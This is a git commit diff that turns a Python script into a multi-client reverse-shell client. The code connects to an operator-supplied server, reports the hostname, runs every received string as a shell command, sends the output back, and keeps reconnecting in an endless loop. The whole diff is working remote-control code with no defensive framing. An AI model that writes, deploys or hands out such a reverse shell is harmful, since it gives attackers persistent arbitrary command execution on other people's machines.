ef321093b5323a7c31416e360412a57eb15c827e
shashank-simha <shashanksimha183@gmail.com>
2018-12-02 12:12:22 +0530

    Add Multiclient

--- MultiClient/client.py
+++ MultiClient/client.py
@@ -1,57 +1,131 @@
 import os
 import socket
 import subprocess
+import time
+import signal
+import sys
+import struct
 
+class Client(object):
 
-# Create a socket
-def socket_create():
-    try:
-        global host
-        global port
-        global s
-        host = input("Enter server IP: ")
-        port = int(input("Enter port: "))
-        s = socket.socket()
-        print("Socket created.\n")
-        
-    except socket.error as msg:
-        print("Socket creation error: " + str(msg))
+    def __init__(self):
+        self.serverHost = input("Enter server IP: ")
+        self.serverPort = int(input("Enter port: "))
+        self.socket = None
 
+    def register_signal_handler(self):
+        signal.signal(signal.SIGINT, self.quit_gracefully)
+        signal.signal(signal.SIGTERM, self.quit_gracefully)
+        return
 
-# Connect to a remote socket
-def socket_connect():
-    try:
-        global host
-        global port
-        global s
-        s.connect((host, port))
-        print("Connection established. Waiting for commands from server")
-        
-    except socket.error as msg:
-        print("Socket connection error: " + str(msg))
+    def quit_gracefully(self, signal=None, frame=None):
+        print('\nQuitting gracefully')
+        if self.socket:
+            try:
+                self.socket.shutdown(2)
+                self.socket.close()
+            except Exception as e:
+                print('Could not close connection %s' % str(e))
+                # continue
+        sys.exit(0)
+        return
 
+    def socket_create(self):
+        """ Create a socket """
+        try:
+            self.socket = socket.socket()
+            print("Socket created successfully")
+        except socket.error as e:
+            print("Socket creation error" + str(e))
+            return
+        return
 
-# Receive commands from remote server and run on local machine
-def receive_commands():
-    global s
-    while True:
-        data = s.recv(1024)
-        if data[:2].decode("utf-8") == 'cd':
-            os.chdir(data[3:].decode("utf-8"))
-        if len(data) > 0:
-            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            output_bytes = cmd.stdout.read() + cmd.stderr.read()
-            output_str = str(output_bytes, "utf-8")
-            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
-            print(output_str)
-    s.close()
+    def socket_connect(self):
+        """ Connect to a remote socket """
+        try:
+            self.socket.connect((self.serverHost, self.serverPort))
+            print("Socket connected to " + self.serverHost)
+        except socket.error as e:
+            print("Socket connection error: " + str(e))
+            time.sleep(5)
+            raise
+        try:
+            self.socket.send(str.encode(socket.gethostname()))
+        except socket.error as e:
+            print("Cannot send hostname to server: " + str(e))
+            raise
+        return
+
+    def print_output(self, output_str):
+        """ Prints command output """
+        sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
+        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
+        print(output_str)
+        return
+
+    def receive_commands(self):
+        """ Receive commands from remote server and run on local machine """
+        try:
+            self.socket.recv(10)
+            print("Waiting for commands from the server")
+        except Exception as e:
+            print('Could not start communication with server: %s\n' %str(e))
+            return
+        cwd = str.encode(str(os.getcwd()) + '> ')
+        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
+        while True:
+            output_str = None
+            data = self.socket.recv(20480)
+            if data == b'': break
+            elif data[:2].decode("utf-8") == 'cd':
+                directory = data[3:].decode("utf-8")
+                try:
+                    os.chdir(directory.strip())
+                except Exception as e:
+                    output_str = "Could not change directory: %s\n" %str(e)
+                else: 
+                    output_str = ""
+            elif data[:].decode("utf-8") == 'quit':
+                self.socket.close()
+                break
+            elif len(data) > 0:
+                try:
+                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
+                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
+                    output_str = output_bytes.decode("utf-8", errors="replace")
+                except Exception as e:
+                    # TODO: Error description is lost
+                    output_str = "Command execution unsuccessful: %s\n" %str(e)
+            if output_str is not None:
+                try:
+                    self.print_output(output_str)
+                except Exception as e:
+                    print('Cannot send command output: %s' %str(e))
+        self.socket.close()
+        return
 
 
 def main():
-    socket_create()
-    socket_connect()
-    receive_commands()
+    client = Client()
+    client.register_signal_handler()
+    client.socket_create()
+    while True:
+        try:
+            client.socket_connect()
+        except Exception as e:
+            print("Error on socket connections: %s" %str(e))
+            time.sleep(5)     
+        else:
+            break    
+    try:
+        client.receive_commands()
+    except Exception as e:
+        print('Error in main: ' + str(e))
+    client.socket.close()
+    return
 
 
-main()
- 
+if __name__ == '__main__':
+    while True:
+        main()
